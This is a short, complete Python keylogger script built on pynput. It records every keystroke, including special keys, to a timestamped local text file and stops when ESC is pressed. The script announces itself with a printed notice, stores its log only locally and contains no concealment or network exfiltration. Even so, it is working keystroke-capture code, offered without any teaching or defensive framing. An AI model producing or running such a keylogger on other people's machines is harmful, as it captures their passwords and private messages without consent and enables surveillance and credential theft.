from pynput import keyboard
import logging
from datetime import datetime

# Set up logging to file
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

print(f"[INFO] Logging keystrokes to {log_filename} (Press ESC to stop)")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("[INFO] ESC pressed — stopping keylogger.")
        return False

# Start listening to keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
